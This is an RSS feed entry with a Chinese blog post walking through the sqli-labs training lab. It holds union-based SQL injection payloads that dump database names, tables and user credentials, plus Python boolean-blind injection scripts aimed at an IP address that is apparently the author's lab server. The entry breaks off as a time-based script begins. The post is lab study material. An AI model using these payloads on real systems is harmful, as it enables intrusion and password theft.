<?xml version="1.0"?>
<rss version="2.0">
    <channel>
        <title>M1N&#39;s Blog • Posts by &#34;sql注入&#34; category</title>
        <link>http://blog.m1n.me</link>
        <description>M1N的博客</description>
        <language>zh-CN</language>
        <pubDate>Sat, 12 Oct 2019 10:48:24 +0800</pubDate>
        <lastBuildDate>Sat, 12 Oct 2019 10:48:24 +0800</lastBuildDate>
        <item>
            <guid isPermalink="true">http://blog.m1n.me/2019/10/12/Sqli-labs/</guid>
            <title>Sqli-labs</title>
            <link>http://blog.m1n.me/2019/10/12/Sqli-labs/</link>
            <pubDate>Sat, 12 Oct 2019 10:48:24 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;注入语句备忘&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入语句备忘&#34;&gt;#&lt;/a&gt; 注入语句备忘&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;查库名： &lt;code&gt;select schema_name from information_schema.schemata&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查表名： &lt;code&gt;select table_name from information_schema.tables where table_schema=&#39;库名&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查列名： &lt;code&gt;select column_name from information_schema.columns where table_name=&#39;表名&#39;&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;查数据： &lt;code&gt;select 列名 from 库名.表名&lt;/code&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
&lt;h1 id=&#34;注意&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注意&#34;&gt;#&lt;/a&gt; 注意&lt;/h1&gt;
&lt;ol&gt;
&lt;li&gt;可将用引号包含的库名，表名转换为十六进制，避免引号被过滤&lt;/li&gt;
&lt;li&gt;数据过多时可以利用 limit 限制数据数量&lt;/li&gt;
&lt;li&gt;同上也可以用 &lt;code&gt;concat&lt;/code&gt;  链接多个数据成为一条返回结果&lt;/li&gt;
&lt;li&gt;…&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;注入类型判断小技巧&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入类型判断小技巧&#34;&gt;#&lt;/a&gt; 注入类型判断小技巧&lt;/h1&gt;
&lt;p&gt;1 和 1&amp;quot; 正常回显，1’报错，判断为字符型，但是还要判断是否有小括号。&lt;/p&gt;
&lt;p&gt;判断小括号有几种方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;2’&amp;amp;&amp;amp;‘1’=&#39;1
&lt;ul&gt;
&lt;li&gt;若查询语句为 where id=’$id’，查询时是 where id=‘2’&amp;amp;&amp;amp;‘1’=‘1’，结果是 where id=‘2’，回显会是 id=2。&lt;/li&gt;
&lt;li&gt;若查询语句为 where id=(’$id’)，查询时是 where id=(‘2’&amp;amp;&amp;amp;‘1’=‘1’)，MySQL 将’2’作为了 Bool 值，结果是 where id=(‘1’)，回显会是 id=1。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;1’)||‘1’=(&#39;1&lt;br&gt;
 若查询语句有小括号正确回显，若无小括号错误回显（无回显）。&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;sqli-labs测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sqli-labs测试&#34;&gt;#&lt;/a&gt; sqli-labs 测试&lt;/h1&gt;
&lt;h2 id=&#34;less-1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-1&#34;&gt;#&lt;/a&gt; Less-1&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;构造 &lt;code&gt;127.0.0.1/Less-1/?id=1&lt;/code&gt;  成功返回数据&lt;/li&gt;
&lt;li&gt;构造 &lt;code&gt;127.0.0.1/Less-1/?id=1&#39;&lt;/code&gt;  出现报错说明存在注入点&lt;/li&gt;
&lt;li&gt;构造 &lt;code&gt;127.0.0.1/Less-1/?id=1&#39; order by 3--+&lt;/code&gt;  测试有几列&lt;/li&gt;
&lt;li&gt;构造 &lt;code&gt;127.0.0.1/Less-1/?id=-1&#39; union select 1,2,3--+&lt;/code&gt;  查看回显点 // 此时需要令查询的 id 不存在&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/1.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/li&gt;
&lt;li&gt;构造 &lt;code&gt;127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata)--+&lt;/code&gt;  查询数据库名。发现报错说数据过多，此时就可以利用 limit 构造： &lt;code&gt;127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select schema_name from information_schema.schemata limit 0,1)--+&lt;/code&gt;  依次进行查看。&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/2.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 或者可以利用 &lt;code&gt;group_concat&lt;/code&gt;  构造： &lt;code&gt;?id=-1&#39; union select 1,2,(select group_concat(schema_name) from information_schema.schemata)--+&lt;/code&gt; &lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/3.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/li&gt;
&lt;li&gt;构造： &lt;code&gt;127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(table_name) from information_schema.tables where table_schema=&#39;security&#39;)--+&lt;/code&gt;  查询表名&lt;br&gt;
此时‘security’可以用十六进制替换，或者用 database ()&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/4.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/li&gt;
&lt;li&gt;构造： &lt;code&gt;127.0.0.1/Less-1/?id=-1&#39; union select 1,2,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)--+&lt;/code&gt;  查询段名&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/5.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/li&gt;
&lt;li&gt;构造： &lt;code&gt;?id=-1&#39; union select 1,2,(select concat_ws(0x7e,username,password) from security.users limit 0,1)--+&lt;/code&gt;  查询数据&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/6.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;br&gt;
 也可以构造： &lt;code&gt;?id=-1&#39; union select 1,2,(select group_concat(username,0x7e,password) from security.users)--+&lt;/code&gt;  查询数据&lt;br&gt;
&lt;img data-fancybox=&#34;gallery&#34; data-sizes=&#34;auto&#34; data-src=&#34;https://iminx-1258939911.cos.ap-chengdu.myqcloud.com/%E5%86%85%E5%AE%B9/Sqli-labs/7.png&#34; alt=&#34;sql&#34; class=&#34;lazyload&#34;&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;至此，sqli-labs 的第一关就算是结束了&lt;/p&gt;
&lt;h2 id=&#34;less-2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-2&#34;&gt;#&lt;/a&gt; Less-2&lt;/h2&gt;
&lt;p&gt;这一关总体和第一关是一样的，只是这里是整型注入，因此不用单引号去闭合，其余操作和第一关相同&lt;/p&gt;
&lt;h2 id=&#34;less-3&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-3&#34;&gt;#&lt;/a&gt; Less-3&lt;/h2&gt;
&lt;p&gt;这一关是利用 &lt;code&gt;&#39;)&lt;/code&gt;  来闭合&lt;/p&gt;
&lt;h2 id=&#34;less-4&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-4&#34;&gt;#&lt;/a&gt; Less-4&lt;/h2&gt;
&lt;p&gt;这一关是利用 &lt;code&gt;&amp;quot;)&lt;/code&gt;  来闭合&lt;/p&gt;
&lt;h2 id=&#34;less-5&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-5&#34;&gt;#&lt;/a&gt; Less-5&lt;/h2&gt;
&lt;p&gt;这关开始就是盲注了，并且通过判断可以得知这是布尔盲注&lt;br&gt;
直接丢出脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;import time&lt;br&gt;&lt;br&gt;url = &amp;quot;http://47.96.233.216:8080/Less-5/?id=1&amp;#x27;&amp;quot;&lt;br&gt;&lt;br&gt;test = &amp;quot;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; security.users &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,10):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(48,122):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(data,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		# print(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		l = len(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		# print(l)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(l==704):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这个脚本还是比较偏向手动化的。。。。&lt;/p&gt;
&lt;h2 id=&#34;less-6&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-6&#34;&gt;#&lt;/a&gt; Less-6&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&amp;quot;&lt;/code&gt;  闭合&lt;/p&gt;
&lt;h2 id=&#34;less-7&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-7&#34;&gt;#&lt;/a&gt; Less-7&lt;/h2&gt;
&lt;p&gt;用 &lt;code&gt;&#39;))&lt;/code&gt;  闭合，但是此时的设定是无论是否正确，返回的数据长度是一样的。此时改变判断方式：&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs n1ql&#34;&gt;import requests&lt;br&gt;&lt;br&gt;url = &amp;quot;http://47.96.233.216:8080/Less-7/?id=1&amp;#x27;))&amp;quot;&lt;br&gt;&lt;br&gt;test = &amp;quot;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;()&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;schema = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; schema_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.schemata &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;table = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; table_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.tables &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_schema=&lt;span class=&#34;hljs-keyword&#34;&gt;database&lt;/span&gt;() &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;column = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; column_name &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; information_schema.columns &lt;span class=&#34;hljs-keyword&#34;&gt;where&lt;/span&gt; table_name=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;users&amp;#x27;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;data = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;select&lt;/span&gt; concat_ws(&lt;span class=&#34;hljs-number&#34;&gt;0x5e&lt;/span&gt;,username,&lt;span class=&#34;hljs-keyword&#34;&gt;password&lt;/span&gt;) &lt;span class=&#34;hljs-keyword&#34;&gt;from&lt;/span&gt; security.users &lt;span class=&#34;hljs-keyword&#34;&gt;limit&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;result = &amp;quot;&lt;/span&gt;&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;for i in range(1,10):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;	for j in range(48,122):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		payload = url + &amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;and&lt;/span&gt; ascii(&lt;span class=&#34;hljs-built_in&#34;&gt;substr&lt;/span&gt;((&amp;#123;&amp;#125;),&amp;#123;&amp;#125;,&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;))=&amp;#123;&amp;#125;--+&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;.format(test,i,j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		r = requests.get(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		txt = r.text&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		l = len(r.text)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		s = &amp;quot;&lt;/span&gt;You are &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt;.... &lt;span class=&#34;hljs-keyword&#34;&gt;Use&lt;/span&gt; outfile......&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;		if(s in txt):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			result+=chr(j)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			print(result)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;			break&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&#34;less-8&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-8&#34;&gt;#&lt;/a&gt; Less-8&lt;/h2&gt;
&lt;p&gt;这一关的闭合方式还是单引号，而且好像和第五关没啥差别？？？只要改一下返回数据长度脚本一样是可以用的？？&lt;/p&gt;
&lt;h2 id=&#34;less-9&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#less-9&#34;&gt;#&lt;/a&gt; Less-9&lt;/h2&gt;
&lt;p&gt;通过测试我们可以发现无论所查询的数据是否存在，都会返回”You are in…“，可以推断这次不是布尔盲注而是时间盲注。丢出时间盲注的脚本：&lt;/p&gt;
&lt;figure class=&#34;highlight n1ql&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td 